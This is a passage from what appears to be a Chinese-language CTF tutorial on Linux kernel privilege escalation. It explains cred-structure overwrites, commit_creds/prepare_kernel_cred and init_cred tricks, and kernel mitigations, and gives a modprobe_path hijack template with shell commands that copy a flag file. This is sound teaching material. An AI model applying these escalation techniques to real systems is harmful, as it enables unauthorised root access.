keyword">struct</span> <span class="token class-name">user_struct</span> <span class="token operator">*</span>user<span class="token punctuation">;</span>   <span class="token comment">/* real user ID subscription */</span>    <span class="token keyword">struct</span> <span class="token class-name">user_namespace</span> <span class="token operator">*</span>user_ns<span class="token punctuation">;</span> <span class="token comment">/* user_ns the caps and keyrings are relative to. */</span>    <span class="token keyword">struct</span> <span class="token class-name">group_info</span> <span class="token operator">*</span>group_info<span class="token punctuation">;</span>  <span class="token comment">/* supplementary groups for euid/fsgid */</span>    <span class="token keyword">struct</span> <span class="token class-name">rcu_head</span> rcu<span class="token punctuation">;</span>        <span class="token comment">/* RCU deletion hook */</span><span class="token punctuation">&#125;</span> __randomize_layout<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="内核态函数"><a href="#内核态函数" class="headerlink" title="内核态函数"></a>内核态函数</h3><p>相比用户态库函数，内核态的函数有了一些变化</p><ul><li><code>printf() -&gt; printk()</code>，但需要注意的是 <code>printk()</code> 不一定会把内容显示到终端上，但<strong>一定在内核缓冲区</strong>里，可以通过 <code>dmesg</code> 查看效果</li><li><code>memcpy() -&gt; copy_from_user()/copy_to_user()</code><ul><li><code>copy_from_user()</code> 将<strong>用户</strong>空间的数据传送到<strong>内核</strong>空间</li><li><code>copy_to_user() </code>     将<strong>内核</strong>空间的数据传送到<strong>用户</strong>空间</li></ul></li><li><code>malloc() -&gt; kmalloc()</code>，内核态的内存分配函数，和<code>malloc()</code>相似，但使用的是 <code>slab/slub 分配器</code></li><li><code>free() -&gt; kfree()</code>，同 <code>kmalloc()</code></li></ul><p>另外要注意的是，<code>kernel 管理进程,也记录了进程的权限</code>,<code>kernel </code>中改变权限的函数：</p><ul><li><strong>int commit_creds(struct cred *new)</strong></li><li><strong>struct cred* prepare_kernel_cred(struct task_struct* daemon)</strong></li></ul><p><em><u>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 <code>root</code> 权限，<code>0</code> 表示 以 <code>0</code> 号进程作为参考准备新的 <code>credentials</code></u></em></p><p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>）。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">grep</span> commit_creds /proc/kallsyms ffffffffbb6af9e0 T commit_credsffffffffbc7cb3d0 r __ksymtab_commit_credsffffffffbc7f06fe r __kstrtab_commit_creds$ <span class="token function">sudo</span> <span class="token function">grep</span> prepare_kernel_cred /proc/kallsymsffffffffbb6afd90 T prepare_kernel_credffffffffbc7d4f20 r __ksymtab_prepare_kernel_credffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>一般情况下，<code>/proc/kallsyms</code> 的内容需要 <code>root</code> 权限才能查看</p></blockquote><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><blockquote><p><code>canary</code>, <code>dep</code>, <code>PIE</code>, <code>RELRO</code> 等保护与用户态原理和作用相同</p></blockquote><ul><li><code>smep</code>: <code>Supervisor Mode Execution Protection</code>，当处理器处于 <code>ring0</code> 模式，<strong>执行</strong>用户空间的代码会触发页错误。（在 <code>arm</code> 中该保护称为 <code>PXN</code>）</li><li><code>smap</code>: <code>Superivisor Mode Access Protection</code>，类似于 <code>smep</code>，通常是在<strong>访问数据</strong>时</li><li><code>mmap_min_addr</code></li></ul><h3 id="CTF-kernel-pwn-相关"><a href="#CTF-kernel-pwn-相关" class="headerlink" title="CTF kernel pwn 相关"></a>CTF kernel pwn 相关</h3><h4 id="题目文件"><a href="#题目文件" class="headerlink" title="题目文件"></a>题目文件</h4><ol><li><p><code>boot.sh</code>: 一个用于启动 <code>kernel</code> 的 <code>shell</code> 的脚本，多用 <code>qemu</code>，保护措施与 <code>qemu</code> 不同的启动参数有关</p></li><li><p><code>bzImage</code>: <code>kernel binary</code></p></li><li><p><code>rootfs.cpio</code>: 文件系统映像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$x</span> babydriver.tarboot.shbzImagerootfs.cpio<span class="token variable">$file</span> bzImagebzImage: Linux kernel x86 boot executable bzImage, version <span class="token number">4.4</span>.72 <span class="token punctuation">(</span>atum@ubuntu<span class="token punctuation">)</span> <span class="token comment">#1 SMP Thu Jun 15 19:52:50 PDT 2017, RO-rootFS, swap_dev 0x6, Normal VGA</span><span class="token variable">$file</span> rootfs.cpiorootfs.cpio: <span class="token function">gzip</span> compressed data, last modified: Tue Jul  <span class="token number">4</span> 08:39:15 <span class="token number">2017</span>, max compression, from Unix, original size <span class="token number">2844672</span><span class="token variable">$file</span> boot.shboot.sh: Bourne-Again shell script, ASCII text executable<span class="token variable">$bat</span> boot.sh ───────┬────────────────────────────────────────────────────────────       │ File: boot.sh───────┼───────────────────────────────────────────────────────────         <span class="token comment">#!/bin/bash</span>         qemu-system-x86_64 <span class="token punctuation">\</span>         <span class="token parameter variable">-initrd</span> rootfs.cpio <span class="token punctuation">\</span>         <span class="token parameter variable">-kernel</span> bzImage <span class="token punctuation">\</span>         <span class="token parameter variable">-append</span> <span class="token string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> <span class="token punctuation">\</span>         -enable-kvm <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>         <span class="token parameter variable">-m</span> 64M <span class="token punctuation">\</span>         <span class="token parameter variable">--nographic</span>  <span class="token punctuation">\</span>         <span class="token parameter variable">-smp</span> <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">1</span>,threads<span class="token operator">=</span><span class="token number">1</span> <span class="token punctuation">\</span>         <span class="token parameter variable">-cpu</span> kvm64,+smep<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><code>-initrd rootfs.cpio</code>，使用<code>rootfs.cpio</code>作为内核启动的文件系统</li><li><code>-kernel bzImage</code>，使用 <code>bzImage</code> 作为 <code>kernel</code> 映像</li><li><code>-cpu kvm64,+smep</code>，设置 <code>CPU</code> 的安全选项，这里开启了 <code>smep</code></li><li><code>-m 64M</code>，设置虚拟 <code>RAM</code> 为 <code>64M</code>，默认为 <code>128M</code></li></ul><h4 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h4><p><code>KASLR</code>：内核地址随机化，相当于<code>ASLR</code>(并非默认启用，需要在内核命令行中加入<code>kaslr</code>开启)</p><p><code>SMEP/SMAP</code>：[<code>SMEP</code>管理模式<strong>执行</strong>保护，禁止<strong>内核访问用户</strong>空间的数据]，[<code>SMAP</code>管理模式<strong>访问</strong>保护，类似于<code>NX</code>，即<strong>内核态无法执行<code>shellcode</code></strong>]</p><p><code>Stack Protector</code>：(<code>canary</code>)在编译内核时设置<code>CONFIG_CC_STACKPROTECTOR</code>，开了这个保护再编译驱动会有<code>canary</code></p><p><code>KPTI</code>：<code>KPTI</code>即内核页表隔离(<code>Kernel page-table isolation</code>)，内核空间与用户空间分别使用两组不同的页表集，这对于内核的<strong>内存管理</strong>产生了根本性的变化</p><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ol><li>解包<code>rootfs</code>,检查保护</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">mkdir</span> File_system$ <span class="token function">mv</span> rootfs.cpio ./File_system/rootfs.cpio.gz$ <span class="token builtin class-name">cd</span> File_system$ gunzip rootfs.cpio.gz$ cpio <span class="token parameter variable">-idmv</span> <span class="token operator">&lt;</span> rootfs.cpio$ <span class="token function">file</span> babydriver.ko $ checksec <span class="token parameter variable">--file</span><span class="token operator">=</span>babydriver.ko<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.拖进<code>IDA</code>在内核代码中找到漏洞</p><p>3.利用<code>Shellcode</code>, <code>ROP</code>, 等攻击方式实现代码执行</p><p>4.提权</p><p>5.本地写好 <code>exploit</code> 后，可以通过 <code>base64</code> 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到<code> flag</code>，同时可以使用 <code>musl</code>, <code>uclibc</code> 等方法减小 <code>exploit</code> 的体积方便传输</p><p>测试<code>exp</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cp</span> ./exp ./fs <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> fs$ <span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span> cpio <span class="token parameter variable">-o</span> <span class="token parameter variable">--format</span><span class="token operator">=</span>newc <span class="token operator">></span> <span class="token punctuation">..</span>/rootfs.cpio <span class="token comment"># 重新打包文件系统</span>$ ./boot.sh <span class="token comment"># 启动&amp;测试exp</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>即获取到 <code>root</code> 权限</p><h4 id="改变自身"><a href="#改变自身" class="headerlink" title="改变自身"></a>改变自身</h4><p>通过改变自身进程的权限，使其具有 root 权限,内核会通过进程的 <code>task_struct</code> 结构体中的 <code>cred</code> 指针来索引 <code>cred</code> 结构体，<code>cred</code>结构体成员中的 <code>uid-fsgid</code> 都为 <code>0</code>则具有 <code>root </code>权限,这种提权方法分为定位和修改两个步骤，<code>cred</code>结构体在<code>include/linux/cred.h</code></p><h5 id="直接改cred结构体的内容"><a href="#直接改cred结构体的内容" class="headerlink" title="直接改cred结构体的内容"></a>直接改cred结构体的内容</h5><h6 id="定位cred具体位置"><a href="#定位cred具体位置" class="headerlink" title="定位cred具体位置"></a>定位cred具体位置</h6><ul><li><p>直接定位</p><p><code>cred</code> 结构体的最前面记录了各种<code> id</code> 信息，对于一个普通的进程而言，<code>uid-fsgid</code> 都是执行进程的用户的身份,因此可以通过<strong>扫描内存</strong>来定位 <code>cred</code></p><p><strong>在实际定位的过程中，我们可能会发现很多满足要求的 cred，这主要是因为 cred 结构体可能会被拷贝、释放。</strong>可以利用 <code>usage</code> 不为 <code>0</code> 来筛除掉一些 <code>cred</code>，但仍然会发现一些 <code>usage</code> 为 <code>0</code> 的 <code>cred</code>,这是因为 <code>cred</code> 从 <code>usage</code> 为 <code>0</code>， 到释放有一定的时间,此外，<code>cred</code> 是使用 <code>rcu</code> <strong>延迟释放</strong>的</p></li><li><p>间接定位</p><ul><li><p><code> task_struct</code></p><p>进程的 <code>task_struct</code> 结构体中会存放指向 <code>cred</code> 的指针，因此我们可以</p><ol><li>定位当前进程 <code>task_struct</code> 结构体的地址</li><li>根据<code> cred</code> 指针相对于 <code>task_struct</code> 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li><li>获取 <code>cred</code> 具体的地址</li></ol></li><li><p><code>comm</code></p><p><code>comm </code>用来标记可执行<strong>文件的名字</strong>，位于进程的 <code>task_struct</code> 结构体中, <code>comm</code> 在 <code>cred</code> 的正下方，所以可以先定位 <code>comm </code>，然后定位 <code>cred</code> 的地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu     <span class="token operator">*</span>ptracer_cred<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu     <span class="token operator">*</span>real_cred<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu     <span class="token operator">*</span>cred<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_KEYS</span></span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>          <span class="token operator">*</span>cached_requested_key<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token keyword">char</span>                comm<span class="token punctuation">[</span>TASK_COMM_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进程名字并不特殊的情况下可能会有多个同样的字符串，,可以使用 <code>prctl</code> 设置进程的<code>comm</code>为一个特殊的字符串，然后再开始定位 <code>comm</code></p></li></ul></li><li><p>修改</p><p>直接将 <code>cred</code> 中的 <code>uid-fsgid</code> 都修改为 <code>0</code>,当然修改的方式有很多种</p><ul><li><p>在我们具有任意地址读写后，可以直接修改 <code>cred</code></p></li><li><p>在我们可以 <code>ROP</code> 执行代码后，可以利用 <code>ROP gadget</code> 修改 <code>cred</code></p></li></ul></li></ul><h6 id="间接定位"><a href="#间接定位" class="headerlink" title="间接定位"></a>间接定位</h6><p>不一定非得知道 <code>cred</code> 的具体位置，只需要能够修改 <code>cred</code> 即可</p><p><strong>UAF 使用同样堆块-过时</strong></p><p>如果我们在进程初始化时能控制 <code>cred</code> 结构体的位置，并且我们可以在初始化后修改该部分的内容，那么我们就可以很容易地达到提权的目的,且不需要任何信息泄露，例子:</p><ol><li>申请一块与 <code>cred</code> 结构体大小一样的堆块</li><li>释放该堆块</li><li><code>fork</code> 出新进程，恰好使用刚刚释放的堆块</li><li>修改 <code>cred</code> 结构体特定内存，从而提权</li></ol><p><strong>此种方法在较新版本内核中已不再可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 <code>cred_jar</code> 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __init <span class="token function">cred_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">/* allocate a slab in which we can store credentials */</span>    cred_jar <span class="token operator">=</span> <span class="token function">kmem_cache_create</span><span class="token punctuation">(</span><span class="token string">"cred_jar"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cred</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>            SLAB_HWCACHE_ALIGN<span class="token operator">|</span>SLAB_PANIC<span class="token operator">|</span>SLAB_ACCOUNT<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="修改-task-struct-结构体中的-cred-指针"><a href="#修改-task-struct-结构体中的-cred-指针" class="headerlink" title="修改 task_struct 结构体中的 cred 指针"></a>修改 task_struct 结构体中的 cred 指针</h5><h6 id="定位cred结构体指针具体位置"><a href="#定位cred结构体指针具体位置" class="headerlink" title="定位cred结构体指针具体位置"></a>定位cred结构体指针具体位置</h6><ul><li><p>间接定位</p><ul><li><p><code>task_struct</code></p><p><code>task_struct</code> 结构体中会存放指向 <code>cred</code> 的指针，可以定位<code>task_struct</code> 结构体的地址,再根据 <code>cred</code> 指针的偏移计算得出 <code>cred</code> 指针地址</p></li><li><p><code>comm</code></p><p>在<code>cred</code>指针正下方，可以使用 <code>prctl</code> 设置进程的 <code>comm</code> 为一个特殊的字符串，然后再定位 <code>comm</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c">    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu     <span class="token operator">*</span>ptracer_cred<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu     <span class="token operator">*</span>real_cred<span class="token punctuation">;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu     <span class="token operator">*</span>cred<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_KEYS</span></span>    <span class="token keyword">struct</span> <span class="token class-name">key</span>          <span class="token operator">*</span>cached_requested_key<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token keyword">char</span>                comm<span class="token punctuation">[</span>TASK_COMM_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>修改</p><ul><li>修改 <code>cred</code> 指针为内核镜像中<strong>已有的</strong><code> init_cred</code> 的地址。这种方法适合于我们<strong>能够直接修改 cred 指针以及知道 init_cred 地址</strong>的情况</li><li>伪造一个 <code>cred</code>，然后修改 <code>cred</code> 指针指向该地址即可。比较麻烦，一般不使用</li></ul></li></ul><h6 id="间接定位-1"><a href="#间接定位-1" class="headerlink" title="间接定位"></a>间接定位</h6><ul><li><p><code>commit_creds(&amp;init_cred)</code></p><p><code>commit_creds()</code> :将一个新的 <code>cred</code> 设为当前进程 <code>task_struct</code> 的 <code>real_cred</code> 与 <code>cred</code> 字段，调用该函数并传入一个具有 <code>root</code> 权限的 <code>cred</code>，则能直接完成对当前进程的提权工作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">commit_creds</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>new<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>task <span class="token operator">=</span> current<span class="token punctuation">;</span><span class="token comment">//内核宏，用以从 percpu 段获取当前进程的 PCB</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>old <span class="token operator">=</span> task<span class="token operator">-></span>real_cred<span class="token punctuation">;</span>    <span class="token comment">//...</span>    <span class="token function">rcu_assign_pointer</span><span class="token punctuation">(</span>task<span class="token operator">-></span>real_cred<span class="token punctuation">,</span> new<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">rcu_assign_pointer</span><span class="token punctuation">(</span>task<span class="token operator">-></span>cred<span class="token punctuation">,</span> new<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在内核初始化过程当中会以 <code>root</code> 权限启动 <code>init</code> 进程，其 <code>cred</code> 结构体为<strong>静态定义</strong>的 <code>init_cred</code>，可以通过 <code>commit_creds(&amp;init_cred)</code> 来完成提权的工作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> init_cred <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">.</span>usage          <span class="token operator">=</span> <span class="token function">ATOMIC_INIT</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_DEBUG_CREDENTIALS</span></span>    <span class="token punctuation">.</span>subscribers        <span class="token operator">=</span> <span class="token function">ATOMIC_INIT</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">.</span>magic          <span class="token operator">=</span> CRED_MAGIC<span class="token punctuation">,</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>    <span class="token punctuation">.</span>uid            <span class="token operator">=</span> GLOBAL_ROOT_UID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>gid            <span class="token operator">=</span> GLOBAL_ROOT_GID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>suid           <span class="token operator">=</span> GLOBAL_ROOT_UID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>sgid           <span class="token operator">=</span> GLOBAL_ROOT_GID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>euid           <span class="token operator">=</span> GLOBAL_ROOT_UID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>egid           <span class="token operator">=</span> GLOBAL_ROOT_GID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>fsuid          <span class="token operator">=</span> GLOBAL_ROOT_UID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>fsgid          <span class="token operator">=</span> GLOBAL_ROOT_GID<span class="token punctuation">,</span>    <span class="token punctuation">.</span>securebits     <span class="token operator">=</span> SECUREBITS_DEFAULT<span class="token punctuation">,</span>    <span class="token punctuation">.</span>cap_inheritable    <span class="token operator">=</span> CAP_EMPTY_SET<span class="token punctuation">,</span>    <span class="token punctuation">.</span>cap_permitted      <span class="token operator">=</span> CAP_FULL_SET<span class="token punctuation">,</span>    <span class="token punctuation">.</span>cap_effective      <span class="token operator">=</span> CAP_FULL_SET<span class="token punctuation">,</span>    <span class="token punctuation">.</span>cap_bset       <span class="token operator">=</span> CAP_FULL_SET<span class="token punctuation">,</span>    <span class="token punctuation">.</span>user           <span class="token operator">=</span> INIT_USER<span class="token punctuation">,</span>    <span class="token punctuation">.</span>user_ns        <span class="token operator">=</span> <span class="token operator">&amp;</span>init_user_ns<span class="token punctuation">,</span>    <span class="token punctuation">.</span>group_info     <span class="token operator">=</span> <span class="token operator">&amp;</span>init_groups<span class="token punctuation">,</span>    <span class="token punctuation">.</span>ucounts        <span class="token operator">=</span> <span class="token operator">&amp;</span>init_ucounts<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>commit_creds(prepare_kernel_cred(0))</code>-<code>6.2</code>之后失效</p><p><code>prepare_kernel_cred()</code> 函数用以拷贝指定进程的 <code>cred</code> 结构体，参数为 <code>NULL </code>时，该函数会拷贝 <code>init_cred</code> 并返回一个有着 <code>root</code> 权限的 <code>cred</code>：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>daemon<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>old<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>new<span class="token punctuation">;</span>    new <span class="token operator">=</span> <span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>cred_jar<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token function">kdebug</span><span class="token punctuation">(</span><span class="token string">"prepare_kernel_cred() alloc %p"</span><span class="token punctuation">,</span> new<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>daemon<span class="token punctuation">)</span>        old <span class="token operator">=</span> <span class="token function">get_task_cred</span><span class="token punctuation">(</span>daemon<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        old <span class="token operator">=</span> <span class="token function">get_cred</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>init_cred<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用 <code>commit_creds(prepare_kernel_cred(NULL))</code>能直接完成提权的工作</p><p>不过自从内核版本 <code>6.2</code> 起，<code>prepare_kernel_cred(NULL)</code> 将<strong>不再拷贝 init_cred，而是将其视为一个运行时错误并返回 NULL</strong>，因此内核<code>6.2</code>之后失效</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span><span class="token function">prepare_kernel_cred</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token operator">*</span>daemon<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>old<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token operator">*</span>new<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">WARN_ON_ONCE</span><span class="token punctuation">(</span><span class="token operator">!</span>daemon<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    new <span class="token operator">=</span> <span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>cred_jar<span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>new<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="改变别人"><a href="#改变别人" class="headerlink" title="改变别人"></a>改变别人</h4><p>通过影响高权限进程的执行，使其完成我们想要的功能</p><h5 id="改数据"><a href="#改数据" class="headerlink" title="改数据"></a>改数据</h5><p><strong>符号链接</strong></p><p>如果一个 <code>root </code>权限的进程会执行一个<strong>符号链接</strong>的程序，并且该<strong>符号链接或者符号链接指向的程序</strong>可以由攻击者控制，攻击者就可以实现提权</p><ul><li><p><code>call_usermodehelper</code></p><p>一种内核线程执行用户态应用的方式，并且启动的进程具有<code>root</code>权限，通过改变某个变量指定的具体要执行的应用提权</p><ul><li><p>修改<code>modprobe_path</code></p><ul><li>获取<code>modprobe_path</code>地址<ul><li>直接定位：取值确定，<code>modprobe_path</code>扫描内存寻找字符串</li><li>间接定位：相对内核基址偏移固定，先获取内核基址再通过偏移得到地址</li></ul></li><li>修改<code>modprobe_path</code>为指定的程序</li><li>触发 <code>call_modprobe</code><ul><li>执行满足相应要求的非法可执行文件</li><li>使用未知协议触发</li></ul></li></ul><p>模板如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// step 1. modify modprobe_path to the target value</span><span class="token comment">// step 2. create related file</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -ne '#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag\ncat flag' > /home/pwn/catflag.sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /home/pwn/catflag.sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// step 3. trigger it using unknown executable</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"echo -ne '\\xff\\xff\\xff\\xff' > /home/pwn/dummy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"chmod +x /home/pwn/dummy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/home/pwn/dummy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// step 3. trigger it using unknown protocol</span><span class="token function">socket</span><span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>修改 <code>poweroff_cmd</code></p></li></ul></li><li><p><code>poweroff_cmd</code></p><ul><li>获取<code>poweroff_cmd</code>地址，方法同上</li><li>修改 <code>poweroff_cmd</code> 为指定的程序</li><li>劫持控制流执行 <code>__orderly_poweroff</code></li></ul></li></ul><h5 id="改代码"><a href="#改代码" class="headerlink" title="改代码"></a>改代码</h5><p>修改<code>root</code>权限执行的代码，内核中 <code>vDSO</code> 的代码会被映射到所有的用户态进程中,高特权的进程周期性地调用 <code>vDSO</code> 中的函数时可以考虑把 <code>vDSO</code> 中相应的函数修改为特定的 <code>shellcode</code>,早期<code>vDSO</code> 是可写的，后来引入 